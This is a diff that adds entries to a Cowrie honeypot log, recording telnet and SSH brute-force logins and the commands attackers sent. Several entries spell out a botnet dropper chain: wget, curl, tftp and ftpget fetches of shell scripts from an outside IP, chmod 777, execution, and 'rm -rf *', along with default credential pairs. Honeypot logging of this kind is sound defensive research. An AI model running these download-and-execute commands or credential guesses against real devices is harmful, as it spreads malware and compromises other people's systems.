@@ -3947,3 +3947,84 @@
 2017-06-15T03:31:59+0000 [CowrieTelnetTransport,55964,182.166.138.140] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
 	]
 2017-06-15T03:31:59+0000 [CowrieTelnetTransport,55964,182.166.138.140] Connection lost after 107 seconds
+2017-06-15T03:32:04+0000 [CowrieTelnetTransport,55968,45.76.171.177] Connection lost after 81 seconds
+2017-06-15T03:32:18+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 45.76.171.177:38918 (10.8.41.81:2223) [session: TT55972]
+2017-06-15T03:32:19+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 45.76.171.177:52942 (10.8.41.81:2223) [session: TT55973]
+2017-06-15T03:32:21+0000 [-] Command found: chmod 777 /tmp/fyfa.sh
+2017-06-15T03:32:21+0000 [-] Command found: sh /tmp/fyfa.sh
+2017-06-15T03:32:21+0000 [-] Command found: tftp 50.115.166.187 -c get tfyfa.sh
+2017-06-15T03:32:21+0000 [-] Command found: chmod 777 tfyfa.sh
+2017-06-15T03:32:21+0000 [-] Command found: sh tfyfa.sh
+2017-06-15T03:32:21+0000 [-] Command found: tftp -r tfyfa2.sh -g 50.115.166.187
+2017-06-15T03:32:21+0000 [-] Command found: chmod 777 tfyfa2.sh
+2017-06-15T03:32:21+0000 [-] Command found: sh tfyfa2.sh
+2017-06-15T03:32:21+0000 [-] Command found: ftpget -v -u anonymous -p anonymous -P 21 50.115.166.187 ftp1.sh ftp1.sh
+2017-06-15T03:32:22+0000 [-] FTP connect failed: host=50.115.166.187, port=21, err=[Errno 111] Connection refused
+2017-06-15T03:32:22+0000 [-] Command found: sh ftp1.sh
+2017-06-15T03:32:22+0000 [-] Command found: rm -rf /tmp/fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh
+2017-06-15T03:32:22+0000 [-] Command found: rm -rf *
+2017-06-15T03:32:22+0000 [-] Command found: /bin/busybox cat /proc/mounts; /bin/busybox ECCHI
+2017-06-15T03:32:22+0000 [-] Command found: cat /proc/mounts; /bin/busybox ECCHI
+2017-06-15T03:32:22+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://50.115.166.187/fyfa.sh>
+2017-06-15T03:32:23+0000 [CowrieTelnetTransport,55972,45.76.171.177] login attempt: 474
+2017-06-15T03:32:23+0000 [CowrieTelnetTransport,55972,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-15T03:32:26+0000 [CowrieTelnetTransport,55972,45.76.171.177] login attempt [admin/] failed
+2017-06-15T03:32:26+0000 [CowrieTelnetTransport,55972,45.76.171.177] Warning: state changed and new state returned
+2017-06-15T03:32:26+0000 [CowrieTelnetTransport,55973,45.76.171.177] login attempt: 475
+2017-06-15T03:32:26+0000 [CowrieTelnetTransport,55973,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-15T03:32:29+0000 [CowrieTelnetTransport,55973,45.76.171.177] login attempt [admin/5up] failed
+2017-06-15T03:32:29+0000 [CowrieTelnetTransport,55973,45.76.171.177] Warning: state changed and new state returned
+2017-06-15T03:32:30+0000 [CowrieTelnetTransport,55972,45.76.171.177] login attempt: 476
+2017-06-15T03:32:30+0000 [CowrieTelnetTransport,55972,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-15T03:32:33+0000 [CowrieTelnetTransport,55972,45.76.171.177] login attempt [enable/shell] failed
+2017-06-15T03:32:33+0000 [CowrieTelnetTransport,55972,45.76.171.177] Warning: state changed and new state returned
+2017-06-15T03:32:34+0000 [CowrieTelnetTransport,55972,45.76.171.177] login attempt: 477
+2017-06-15T03:32:34+0000 [CowrieTelnetTransport,55972,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-15T03:32:36+0000 [CowrieTelnetTransport,55972,45.76.171.177] login attempt [sh/cd /tmp; wget http://50.115.166.187/fyfa.sh; curl -O http://50.115.166.187/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 50.115.166.187 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 50.115.166.187; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 50.115.166.187 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *] failed
+2017-06-15T03:32:36+0000 [CowrieTelnetTransport,55972,45.76.171.177] Warning: state changed and new state returned
+2017-06-15T03:32:36+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 183.155.253.186:55104 (10.8.41.81:2223) [session: TT55974]
+2017-06-15T03:32:36+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 45.76.171.177:59134 (10.8.41.81:2223) [session: TT55975]
+2017-06-15T03:32:37+0000 [CowrieTelnetTransport,55973,45.76.171.177] login attempt: 478
+2017-06-15T03:32:37+0000 [CowrieTelnetTransport,55973,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-15T03:32:39+0000 [CowrieTelnetTransport,55973,45.76.171.177] login attempt [enable/shell] failed
+2017-06-15T03:32:39+0000 [CowrieTelnetTransport,55973,45.76.171.177] Warning: state changed and new state returned
+2017-06-15T03:32:40+0000 [CowrieTelnetTransport,55973,45.76.171.177] login attempt: 479
+2017-06-15T03:32:40+0000 [CowrieTelnetTransport,55973,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-15T03:32:42+0000 [CowrieTelnetTransport,55973,45.76.171.177] login attempt [sh/cd /tmp; wget http://50.115.166.187/fyfa.sh; curl -O http://50.115.166.187/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 50.115.166.187 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 50.115.166.187; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 50.115.166.187 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *] failed
+2017-06-15T03:32:42+0000 [CowrieTelnetTransport,55973,45.76.171.177] Warning: state changed and new state returned
+2017-06-15T03:32:42+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 45.76.171.177:36203 (10.8.41.81:2223) [session: TT55976]
+2017-06-15T03:32:43+0000 [CowrieTelnetTransport,55974,183.155.253.186] first time for 183.155.253.186, need: 1
+2017-06-15T03:32:43+0000 [CowrieTelnetTransport,55974,183.155.253.186] login attempt: 1
+2017-06-15T03:32:46+0000 [CowrieTelnetTransport,55974,183.155.253.186] login attempt [root/admin] succeeded
+2017-06-15T03:32:48+0000 [CowrieTelnetTransport,55974,183.155.253.186] Opening TTY Log: log/tty/20170615-033248-None-55974i.log
+2017-06-15T03:32:48+0000 [CowrieTelnetTransport,55974,183.155.253.186] Warning: state changed and new state returned
+2017-06-15T03:32:48+0000 [CowrieTelnetTransport,55975,45.76.171.177] login attempt: 480
+2017-06-15T03:32:48+0000 [CowrieTelnetTransport,55975,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-15T03:32:51+0000 [CowrieTelnetTransport,55975,45.76.171.177] login attempt [Administrator/] failed
+2017-06-15T03:32:51+0000 [CowrieTelnetTransport,55975,45.76.171.177] Warning: state changed and new state returned
+2017-06-15T03:32:51+0000 [CowrieTelnetTransport,55974,183.155.253.186] CMD: enable
+2017-06-15T03:32:51+0000 [CowrieTelnetTransport,55974,183.155.253.186] Command found: enable 
+2017-06-15T03:32:51+0000 [CowrieTelnetTransport,55974,183.155.253.186] Reading txtcmd from "txtcmds/bin/enable"
+2017-06-15T03:32:51+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 129.146.31.194:56742 (10.8.41.81:2222) [session: 1a947976]
+2017-06-15T03:32:51+0000 [HoneyPotSSHTransport,32220,129.146.31.194] Remote SSH version: SSH-2.0-libssh2_1.6.0
+2017-06-15T03:32:51+0000 [HoneyPotSSHTransport,32220,129.146.31.194] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-15T03:32:51+0000 [HoneyPotSSHTransport,32220,129.146.31.194] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-15T03:32:51+0000 [HoneyPotSSHTransport,32220,129.146.31.194] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-15T03:32:52+0000 [CowrieTelnetTransport,55975,45.76.171.177] login attempt: 481
+2017-06-15T03:32:52+0000 [CowrieTelnetTransport,55975,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-15T03:32:54+0000 [CowrieTelnetTransport,55975,45.76.171.177] login attempt [enable/shell] failed
+2017-06-15T03:32:54+0000 [CowrieTelnetTransport,55975,45.76.171.177] Warning: state changed and new state returned
+2017-06-15T03:32:54+0000 [CowrieTelnetTransport,55975,45.76.171.177] login attempt: 482
+2017-06-15T03:32:54+0000 [CowrieTelnetTransport,55975,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-15T03:32:57+0000 [CowrieTelnetTransport,55975,45.76.171.177] login attempt [sh/cd /tmp; wget http://50.115.166.187/fyfa.sh; curl -O http://50.115.166.187/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 50.115.166.187 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 50.115.166.187; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 50.115.166.187 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *] failed
+2017-06-15T03:32:57+0000 [CowrieTelnetTransport,55975,45.76.171.177] Warning: state changed and new state returned
+2017-06-15T03:32:57+0000 [CowrieTelnetTransport,55974,183.155.253.186] CMD: system
+2017-06-15T03:32:57+0000 [CowrieTelnetTransport,55974,183.155.253.186] Command not found: system
+2017-06-15T03:32:58+0000 [CowrieTelnetTransport,55976,45.76.171.177] login attempt: 483
+2017-06-15T03:32:58+0000 [CowrieTelnetTransport,55976,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-15T03:33:01+0000 [CowrieTelnetTransport,55976,45.76.171.177] login attempt [default/] failed
+2017-06-15T03:33:01+0000 [CowrieTelnetTransport,55976,45.76.171.177] Warning: state changed and new state returned
+2017-06-15T03:33:01+0000 [HoneyPotSSHTransport,32220,129.146.31.194] connection lost
+2017-06-15T03:33:01+0000 [HoneyPotSSHTransport,32220,129.146.31.194] Connection lost after 9 seconds
+2017-06-15T03:33:01+0000 [CowrieTelnetTransport,55976,45.76.171.177] login attempt: 484
+2017-06-15T03:33:01+0000 [CowrieTelnetTransport,55976,45.76.171.177] login return, expect: [admin/meinsm]
